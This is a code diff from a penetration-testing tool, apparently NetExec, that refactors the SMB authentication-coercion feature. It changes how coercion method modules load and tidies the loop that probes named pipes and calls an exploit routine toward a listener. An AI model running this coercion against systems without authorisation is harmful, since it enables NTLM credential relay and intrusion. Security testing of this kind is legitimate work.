@@ -2008,20 +2008,14 @@ class smb(connection):
         # And SMBTransport did samething in dcerpc connect
         # https://github.com/fortra/impacket/blob/master/impacket/dcerpc/v5/transport.py#L497
 
-        from nxc.loaders.moduleloader import ModuleLoader
-        from os.path import dirname
-        from os.path import join as path_join
-        import nxc
-        method_paths = [
-            path_join(dirname(nxc.__file__), "data", "coercer_method"),
-            path_join(NXC_PATH, "data", "coercer_method"),
-        ]
-        method_modules = ModuleLoader.load_all_modules_from_subdirs(method_paths)
+        from nxc.loaders.coercerloader import CoercerLoader
+        method_modules = CoercerLoader.load_all_coercer_methods()
+
         Coercer_ = Coercer(self.logger, self.args.coercer_timeout, method_modules)
         protocol_config, aliasName = Coercer_.config()
 
         if self.args.coercer != "all":
-            ms_protocolName = [k for k, v in aliasName.items() if v == self.args.coercer][0]
+            ms_protocolName = next(k for k, v in aliasName.items() if v == self.args.coercer)
             protocol_config = {
                 ms_protocolName: protocol_config[ms_protocolName],
             }
@@ -2045,8 +2039,8 @@ class smb(connection):
                     )
                     if dce is not None:
                         accessible_Pipe.append(coerce_method["pipeName"])
-                        if self.args.coercer_listener is not None: # Do exploit
-                            exploit_success = Coercer_.exploit(
+                        if self.args.coercer_listener is not None:  # Do exploit
+                            Coercer_.exploit(
                                 dce=dce,
                                 target=self.remoteName,
                                 listener=self.args.coercer_listener,
@@ -2055,8 +2049,6 @@ class smb(connection):
                                 exploitName=aliasName[ms_protocolName],
                                 pipeName=coerce_method["pipeName"]
                             )
-                            #if exploit_success and not self.args.coercer_always_continue:
-                            #    break
                         dce.disconnect()
                     else:
                         self.logger.debug(f'{ms_protocolName}: PIPE: {coerce_method["pipeName"]} is not accessible on target: {self.remoteName}')
@@ -2064,4 +2056,4 @@ class smb(connection):
                     self.logger.error(f"Error: {e}")
 
             if accessible_Pipe:
-                self.logger.highlight(f'{aliasName[ms_protocolName]}: Accessible PIPE: {accessible_Pipe}')
+                self.logger.highlight(f"{aliasName[ms_protocolName]}: Accessible PIPE: {accessible_Pipe}")
